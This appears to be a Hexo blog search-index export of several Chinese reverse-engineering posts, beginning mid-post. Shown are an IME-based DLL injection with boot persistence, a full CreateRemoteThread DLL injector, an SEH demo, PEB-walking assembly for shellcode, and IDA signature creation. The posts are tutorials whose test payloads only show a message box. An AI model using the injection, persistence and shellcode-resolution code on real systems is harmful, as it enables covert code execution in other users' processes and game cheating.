lpImeInfo-&gt;fdwProperty = IME_PROP_KBD_CHAR_FIRST | IME_PROP_UNICODE | IME_PROP_IGNORE_UPKEYS | IME_PROP_SPECIAL_UI;    lpImeInfo-&gt;fdwConversionCaps = IME_CMODE_NATIVE | IME_CMODE_NOCONVERSION;    lpImeInfo-&gt;fdwSentenceCaps = 0;    lpImeInfo-&gt;fdwUICaps = UI_CAP_ROT90;    lpImeInfo-&gt;fdwSCSCaps = SCS_CAP_COMPSTR | SCS_CAP_MAKEREAD;    lpImeInfo-&gt;fdwSelectCaps = (DWORD)0;    lstrcpy(lpszUIClass, &quot;CInjWindow&quot;);//注意这里，对ImeInquire赋予我们刚刚创建的类    return TRUE;}</code></pre><p>因为输入法需要图标，所以需要添加资源文件，右键dll项目添加<br><img src="https://img-blog.csdnimg.cn/20190826175254835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>添加位图<br><img src="https://img-blog.csdnimg.cn/20190826175356971.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>要修改version值如下</p><p><img src="https://img-blog.csdnimg.cn/20190826174911782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>然后生成就好了</p><h3 id="真正需要注入的dll"><a href="#真正需要注入的dll" class="headerlink" title="真正需要注入的dll"></a>真正需要注入的dll</h3><p>其实干正事的过程也可以直接放到ime中，但是步方便管理，我这里写出来了<br>也是一个dll项目</p><p>因为我只是测试，所以就写的很简单，一个验证父进程函数名的就可以了。（游戏辅助代码就可以写在这）<br><strong>dllmain.cpp</strong>如下</p><pre><code class="c">    case DLL_PROCESS_ATTACH:        //获取当前程序名        GetModuleFileName(GetModuleHandle(0),lpFileName,sizeof(lpFileName));        //打印出来        MessageBox(0,lpFileName, 0, 0);}</code></pre><h3 id="加载ime"><a href="#加载ime" class="headerlink" title="加载ime"></a>加载ime</h3><p>把上面生成的<strong>dll</strong>改名为<strong>ime</strong>结尾，复制到<strong>windows32</strong>目录下</p><p>接下来创建一个控制台项目</p><p>如下</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &quot;windows.h&quot;#include &quot;imm.h&quot;#pragma comment(lib,&quot;imm32.lib&quot;)int _tmain(int argc, _TCHAR* argv[]){    if (argc&lt;3)    {        MessageBox(0, &quot;请注意参数 exp：exeName.exe imeName.ime Jerry&quot;, 0, 0);        return 0;    }    LPCSTR infecPath = argv[1];    LPCSTR infecName = argv[2];    PVOID m_retV;    //得到默认的输入法句柄并保存    ::SystemParametersInfo(        SPI_GETDEFAULTINPUTLANG,        0,        &amp;m_retV,        0);    //安装输入法    HKL m_hImeFile = ImmInstallIME(        infecPath,        infecName);    if (ImmIsIME(m_hImeFile))    {        //设置为默认输入法        SystemParametersInfo(            SPI_SETDEFAULTINPUTLANG,            0,            &amp;m_hImeFile,            SPIF_SENDWININICHANGE);        MessageBox(0, &quot;安装输入法成功&quot;, 0, 0);    }    else    {        MessageBox(0, &quot;error 安装出错了&quot;, 0, 0);    }}</code></pre><p>把编译生成的exe文件也拷贝到<strong>windows32</strong>下</p><p>安装命令如下    <code>exeName.exe imeName.ime Jerry</code></p><p>安装程序可以自由发挥，只要把ime文件安装到系统上就是了</p><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>当你安装成功后，就会有弹窗提示，你打开任意一个程序，都会有弹窗提示这个程序的路径。这就说明已经注入成功了。</p><p>开机后在切换输入法时也会启动</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>注入</tag>
      
      <tag>开机启动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>远线程注入</title>
    <link href="/cray/2019/08/26/%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/cray/2019/08/26/%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是远线程注入"><a href="#什么是远线程注入" class="headerlink" title="什么是远线程注入"></a>什么是远线程注入</h3><p>在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>下面例子是根据查询一打开窗口中的计算器进程，然后<br><img src="https://img-blog.csdnimg.cn/20190826100826723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>注释都很详细 </p><pre><code class="c">#include &quot;windows.h&quot;#include &quot;Tlhelp32.h&quot;int InjectDll(DWORD dwProcessId, PTCHAR szDllName);int EnablePrivilege(bool isStart);DWORD GetProcessId(PTCHAR pszProcessName);void main(){    DWORD ProcessId = GetProcessId(&quot;calc.exe&quot;);\\目标程序    InjectDll(ProcessId ,&quot;C:\\Users\\sam\\Desktop\\A.dll&quot;);\\注入dll的地址}int InjectDll(DWORD dwProcessId, PTCHAR szDllName){    if (szDllName[0] == NULL)        return -1;    //提高权限相关操作    EnablePrivilege(TRUE);    //1. 打开进程    HANDLE hProcess = OpenProcess(  PROCESS_ALL_ACCESS,   //打开进程权限        FALSE,                                              //是否可继承         dwProcessId);                                       //进程ID    if (hProcess == INVALID_HANDLE_VALUE)        return -1;    //2. 在远程进程中申请空间    LPVOID pszDllName = VirtualAllocEx(hProcess, //远程进程句柄        NULL,                                  //建议开始地址        4096,                                  //分配空间大小        MEM_COMMIT,                            //空间初始化全0        PAGE_EXECUTE_READWRITE);               //空间权限    if (NULL == pszDllName)    {        return -1;    }    //3. 向远程进程中写入数据    BOOL bRet = WriteProcessMemory( hProcess, pszDllName,         szDllName, MAX_PATH, NULL);    if (NULL == bRet)    {        return -1;    }    //4. 在远程进程中创建远程线程    HANDLE m_hInjecthread = CreateRemoteThread(hProcess,      //远程进程句柄    NULL,                                            //安全属性    0,                                               //栈大小    (LPTHREAD_START_ROUTINE)LoadLibrary,             //进程处理函数        pszDllName,                                      //传入参数    NULL,                                            //默认创建后的状态    NULL);                                           //线程ID    if (NULL == m_hInjecthread)    {        DWORD dwErr = GetLastError();        return -1;    }    //5. 等待线程结束返回    DWORD dw = WaitForSingleObject(m_hInjecthread, -1);    //6. 获取线程退出码,即LoadLibrary的返回值，即dll的首地址    DWORD dwExitCode;    GetExitCodeThread(m_hInjecthread, &amp;dwExitCode);    HMODULE m_hMod = (HMODULE)dwExitCode;    //7. 释放空间    BOOL bReturn = VirtualFreeEx(hProcess, pszDllName,         4096, MEM_DECOMMIT);    if (NULL == bReturn)    {        return -1;    }    CloseHandle(hProcess);    hProcess = NULL;    //恢复权限相关操作    EnablePrivilege(FALSE);    return 0;}int EnablePrivilege(bool isStart){            //1. 得到令牌句柄    HANDLE  hToken = NULL;      //令牌句柄      if (!OpenProcessToken( GetCurrentProcess(),         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_READ,         &amp;hToken))    {           return FALSE;    }    //2. 得到特权值    LUID    luid = {0};         //特权值    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))    {        return FALSE;    }    //3. 提升令牌句柄权限    TOKEN_PRIVILEGES tp = {0};  //令牌新权限    tp.PrivilegeCount = 1;     tp.Privileges[0].Luid = luid;    tp.Privileges[0].Attributes = isStart ? SE_PRIVILEGE_ENABLED : 0;    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL))    {        return FALSE;    }    //4. 关闭令牌句柄    CloseHandle(hToken);    return 0;}DWORD GetProcessId(PTCHAR pszProcessName){    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取当前系统的快照，这种方法能拿到想要的进程ID    if (INVALID_HANDLE_VALUE == hProcess)    {        return 0;    }    DWORD dwProcessId = 0;    PROCESSENTRY32 process32 = {0};    process32.dwSize = sizeof(PROCESSENTRY32);    BOOL bRetProcess = FALSE;    bRetProcess = Process32First(hProcess, &amp;process32);    do    {        if (strcmp(pszProcessName, process32.szExeFile) == 0)//名称对上，获取其进程ID        {            dwProcessId = process32.th32ProcessID;            break;        }        bRetProcess = Process32Next(hProcess, &amp;process32);    }while (bRetProcess);    CloseHandle(hProcess);    return dwProcessId;}</code></pre>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEH创建与查找</title>
    <link href="/cray/2019/08/26/SEH%E5%88%9B%E5%BB%BA%E4%B8%8E%E6%9F%A5%E6%89%BE/"/>
    <url>/cray/2019/08/26/SEH%E5%88%9B%E5%BB%BA%E4%B8%8E%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<p>创建一个SEH处理函数</p><pre><code>#include &quot;stdafx.h&quot;#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &quot;stdlib.h&quot;DWORD scratch;EXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,                        void * EstablisherFrame,                        struct _CONTEXT *ContextRecord,                        void * DispatcherContext){    unsigned i;    MessageBox(0,_T(&quot;i am in except!!!&quot;),0,0);    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;//将eax的值修改为一个全局变量的地址，就可以写入了    //printf(&quot;%08X \n &quot;, ContextRecord-&gt;Eip);//0x4114c5    ContextRecord-&gt;Eip += 0x2A;//这里修改的EIP，等于修改恢复异常后下一要执行的语句    return ExceptionContinueExecution;//这是异常处理的返回结果，让程序返回执行ContextRecord-&gt;Eip的代码}int main(){    __asm    {        push exceptHandler // handler函数的地址        push FS:[0] // 保存上一级的SEH链地址        mov FS:[0],ESP // 安装新的EXECEPTION_REGISTRATION结构    }    __asm    {        mov eax, 0     // 将EAX清零        mov[eax], 1 // 向0地址写入，会产生访问异常    }    printf(&quot;Yes you right!!!\n&quot;);    __asm    {        mov    eax, [ESP]    // 获取前一个结构        mov FS:[0], EAX // 恢复之前的链        add esp, 8       // 恢复堆栈    }    return 0;    printf(&quot;Hello Cray\n&quot;);    exit(0);}</code></pre><p><img src="D:%5Cgit%E7%AC%94%E8%AE%B0%5Csource_posts%5C20190826" srcset="/cray/img/loading.gif" alt></p><p>Wingdb 调试如图断下，地址访问异常</p><p>我来看看在内存中的什么位置</p><p>因为SHE链在线程环境块结构偏移为0的地方</p><pre><code>0:000&gt; !tebTEB at 7ffdf000    ExceptionList:        0012fe4c    StackBase:            00130000    StackLimit:           0012e000    SubSystemTib:         00000000    FiberData:            00001e00    ArbitraryUserPointer: 00000000    Self:                 7ffdf000    EnvironmentPointer:   00000000    ClientId:             000026a8 . 0000275c    RpcHandle:            00000000    Tls Storage:          7ffdf02c    PEB Address:          7ffd9000    LastErrorValue:       0    LastStatusValue:      c0000139    Count Owned Locks:    0    HardErrorMode:        0</code></pre><p>查看teb结构地址。接下来我们将这个地址与TEB结构对应</p><pre><code>0:000&gt; dt _teb 7ffdf000 .ntdll!_TEB   +0x000 NtTib            :       +0x000 ExceptionList    : 0x0012fe4c _EXCEPTION_REGISTRATION_RECORD      +0x004 StackBase        : 0x00130000 Void      +0x008 StackLimit       : 0x0012e000 Void      +0x00c SubSystemTib     : (null)       +0x010 FiberData        : 0x00001e00 Void      +0x010 Version          : 0x1e00      +0x014 ArbitraryUserPointer : (null)       +0x018 Self             : 0x7ffdf000 _NT_TIB   +0x01c EnvironmentPointer :    +0x020 ClientId         :       +0x000 UniqueProcess    : 0x000026a8 Void      +0x004 UniqueThread     : 0x0000275c Void   +0x028 ActiveRpcHandle  :    +0x02c ThreadLocalStoragePointer :    +0x030 ProcessEnvironmentBlock : </code></pre><p>可以看到<code>_EXCEPTION_REGISTRATION_RECORD</code> 结构的地址为</p><p>0x0012fe4c </p><pre><code class="0:000&gt;">Exceptions1!_EXCEPTION_REGISTRATION_RECORD   +0x000 Next             : 0x0012ff70 _EXCEPTION_REGISTRATION_RECORD   +0x004 Handler          : 0x004110a0     _EXCEPTION_DISPOSITION  Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT+0</code></pre><p>Next指向下一个处理函数，Handler指向当前SHE的处理函数</p><pre><code>0:000&gt; u 0x004110a0     Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT:004110a0 e91b030000      jmp     Exceptions1!_except_handler1 (004113c0)Exceptions1!ILT+160(__initterm):004110a5 e984220000      jmp     Exceptions1!initterm (0041332e)Exceptions1!ILT+165(___crtTerminateProcess):004110aa e9cd220000      jmp     Exceptions1!_crtTerminateProcess (0041337c)Exceptions1!ILT+170(___report_securityfailure):004110af e99c0d0000      jmp     Exceptions1!__report_securityfailure (00411e50)Exceptions1!ILT+175(___atonexitinit):004110b4 e9271f0000      jmp     Exceptions1!__atonexitinit (00412fe0)Exceptions1!ILT+180(__RTC_UninitUse):004110b9 e962180000      jmp     Exceptions1!_RTC_UninitUse (00412920)Exceptions1!ILT+185(___report_securityfailureEx):004110be e99d0e0000      jmp     Exceptions1!__report_securityfailureEx (00411f60)Exceptions1!ILT+190(__RTC_Shutdown):004110c3 e9d8060000      jmp     Exceptions1!_RTC_Shutdown (004117a0)</code></pre><p>我们看汇编代码，看看具体SHE的实现，因为我是debug版本的程序，所以由上面的跳转</p><pre><code>0:000&gt; u 4113c0 .004113c0 55              push    ebp004113c1 8bec            mov     ebp,esp004113c3 81eccc000000    sub     esp,0CCh004113c9 53              push    ebx004113ca 56              push    esi004113cb 57              push    edi004113cc 8dbd34ffffff    lea     edi,[ebp-0CCh]004113d2 b933000000      mov     ecx,33h004113d7 b8cccccccc      mov     eax,0CCCCCCCCh004113dc f3ab            rep stos dword ptr es:[edi]004113de 8bf4            mov     esi,esp004113e0 6858584100      push    offset Exceptions1!`string&#39; (00415858)004113e5 ff1514914100    call    dword ptr [Exceptions1!_imp__printf (00419114)]004113eb 83c404          add     esp,4004113ee 3bf4            cmp     esi,esp</code></pre><p>这就是我们自己加的SHE处理函数</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEH</tag>
      
      <tag>Windbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MASH和内联MASH</title>
    <link href="/cray/2019/08/22/MASH%E5%92%8C%E5%86%85%E8%81%94MASH/"/>
    <url>/cray/2019/08/22/MASH%E5%92%8C%E5%86%85%E8%81%94MASH/</url>
    
    <content type="html"><![CDATA[<p>开始前一定先了解下汇编的种类<code>https://blog.csdn.net/ye1223/article/details/79060434</code></p><p>我这里只简述我学习的<strong>MASH汇编</strong>和<strong>内联的MASH格式</strong>的汇编</p><h3 id="mash-汇编如下"><a href="#mash-汇编如下" class="headerlink" title="mash 汇编如下"></a>mash 汇编如下</h3><p>下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到</p><pre><code class="mash">.386.model flat,stdcalloption casemap:none; 包含printf函数所在的头文件和库文件include msvcrt.inc ; 微软vc运行时库的头文件,           ; 一般包含的时c语言的各个头文件includelib msvcrt.lib ; 包含头文件所对应的库文件assume fs:nothing.const ; 全局常量g_formtStr db &quot;%-40s      &quot;,0g_formtInt db &quot;%d &quot;,0ah,0g_formtHex db &quot;%08X &quot;,0ah,0.codeGetA proc    LOCAL @addOfFunc;    LOCAL @AddOfName;    LOCAL @AddOfNaOrd;    LOCAL @Sum;    mov eax,fs:[48];fs表示当前线程的teb结构，eax为PEB的地址    mov eax,[eax+12];获取这个进程的导入dll    mov eax,[eax+28];获取PEB_LDR_DATA结构v     mov eax,[eax];获取第一个结构的值    mov eax,[eax];获取第一个结构的值    mov ebx,[eax+8h];ebx=dll基质    mov eax,[ebx+3ch]    mov eax,[eax+ebx+78h]    add eax,ebx    mov ecx,[eax+14h];//Sumfunc    mov edx,[eax+1ch];//AddressOfFunctions    mov esi,[eax+20h];//AddressOfNames    mov edi,[eax+24h];//AddressOfNameOrdinals    add edx,ebx;    add esi,ebx;    add edi,ebx;//edi 已经是第一个符号的地址（2字节）    mov @addOfFunc,edx;    mov @AddOfName,esi;    mov @AddOfNaOrd,edi;    ;mov ecx,10;    mov @Sum,ecx;    xor ecx,ecx;清空计数器LL1:    push ecx;因为printf会影响ecx,eax,edx的值，所以只要把这个push到栈中临时保存    mov eax,[esi+ecx*4];esi指向的是AddressOfNames的RVA表地址，每一个RVA都是一个DWORD 所以要*4    add eax,ebx;ebx是这个dll的基值     push eax ; offset 伪指令能够取到一个标识符的地址    push offset g_formtStr;输出格式    call crt__cprintf ; 调用函数    add esp,8;//打印Func名字     pop ecx;把偏移pop出来使用    mov eax,@AddOfNaOrd;取符号表的基值    add eax,ecx;    add eax,ecx;这里的两个add是因为每个符号表只占一个WORD，（等于eax+ecx*2)    mov eax,[eax];拿出这个偏移的符号值    and eax,0FFFFh;应为eax是DWORD 而我们只要内存中的低四位，所以这样取    push ecx;还是因为prinf会破坏ecx的值     ;push eax ; offset 伪指令能够取到一个标识符的地址    ;push offset g_formtInt    ;call crt__cprintf ; 调用函数    ;add esp,8;//打印名字     mov edx,@addOfFunc;    add edx,eax;    add edx,eax;    add edx,eax;    add edx,eax;这里也和上面一样，相当于edx+eax*4,因为函数地址=BaseAddressOfFunctions+对应符号表值    mov edx,[edx];取AddressOfFunctions指向的地址    add edx,ebx;这个地址是RVA要加上dll的BASE    ;call edx;    push edx ; offset 伪指令能够取到一个标识符的地址    push offset g_formtHex;a    call crt__cprintf ; 调用函数    add esp,8;//打印名字     pop ecx    add ecx ,1;    cmp ecx,@Sum    jne LL1    retGetA endpmain:    call GetA;    ret end mainend </code></pre><h3 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h3><p>使用这种汇编可以提高我们生产效率,完全可以写成shellcode，任何函数都能自己实现，自己调用，不需要静态导入函数，全部动态自己调用导入函数的API</p><p>内联函数的硬编码确实是个麻烦事，找到了如下的解决方案，在代码段写数据，然后跳过他</p><pre><code class="c">#include &quot;windows.h&quot;FARPROC LoadLibA(char *szModlePath,char* funcName){    /*    __IN szModlePath 要导入的dll地址    __IN funcName 要查询这个dll里面的具体函数名    __return 返回值是一个远call，保存的是这个funcName的地址    */    __asm    {        mov eax,FS:[30h];        mov eax,[eax+0Ch];        mov eax,[eax+1Ch];//这个是第一个ldr_data结构指向第一个模块        mov eax,[eax];//拿到第一个模块的门三地址  C:\Windows\system32\KERNELBASE.dll        mov eax,[eax]//kernel32.dll        mov ebx,[eax+08h];//GetDllBase = ebx        //         现在进去dll内存操作        mov eax,[ebx+3Ch];        mov eax,[eax+ebx+78h];        add eax,ebx;        mov edi,[eax+1Ch];        add edi,ebx;     //edx = AddressOfFunctions这张表的基值(已经指向第一个无名函数了)        //查表，LoadLibraryW在kernel32中符号位为0x341    LoadLibraryA = 0x33e        //mov esi,341H;        mov esi,33EH; //LoadLibraryW        sub esi,1h;//可以不用管        mov eax,[edi+esi*4];        add eax,ebx;//LoadLibraryW的地址        push szModlePath        call eax    //eax = 获取dll的起始地址        mov esi,246h;//GetProcAddress        sub esi,1;        mov ecx,[edi+esi*4];        add ecx,ebx;        jmp L1szFuncName: _EMIT &#39;A&#39;            _EMIT &#39;d&#39;            _EMIT &#39;d&#39;            _EMIT 0x00            //硬编码字符串在代码段L1:        //push offset szFuncName;        push funcName;        push eax;        call ecx;//获取到funcName的地址，返回到eax中        //call eax;//执行这个func    }       //函数返回都是eax方式返回}int main(){    FARPROC Addr =LoadLibA(&quot;user32.dll&quot;,&quot;MessageBoxA&quot;);    __asm    {        push 0;        push 0;        push 0;        push 0;        call eax;    }    return 0;}</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
      <tag>内联汇编</tag>
      
      <tag>mash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA制作签名</title>
    <link href="/cray/2019/08/18/IDA%E5%88%B6%E4%BD%9C%E7%AD%BE%E5%90%8D/"/>
    <url>/cray/2019/08/18/IDA%E5%88%B6%E4%BD%9C%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<p>我这里使用的是IDA6.8的制作签名包<br>如果我们知道是什么语言 的，但是没有签名包，就自己做一个</p><h3 id="手工方式："><a href="#手工方式：" class="headerlink" title="手工方式："></a>手工方式：</h3><pre><code>1.pcf.exe source.lib XXXX.pcf2.sigmake.exe XXXX.pcf YYYY.sig这里一般会生成一个XXXX.exc的文件，打开它，删除以；开始的几行，保存退出3.再次执行sigmake.exe XXXX.pcf YYYY.sig，就会看到有YYYY.sig的签名文件了</code></pre><p>然后把这个文件拷贝到IDA目录下的sig文件夹下面<br>接着重启IDA，拖入自己的项目，按shift + F5 打开签名文件管理器，右键添加就可以了</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>网上有脚本，但是运行不了，我小改了一下，效果还不错<br><img src="https://img-blog.csdnimg.cn/20190808133028934.gif" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>如果要制作单个sig的话，可以直接使用脚本中的lib2sig.bat<br>用法：<br>    <code>lib2sig.bat vclibxxx.lib</code><br>直接生成一个sig文件</p><p>链接: <a href="https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw" target="_blank" rel="noopener">https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw</a> 提取码: f2by </p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
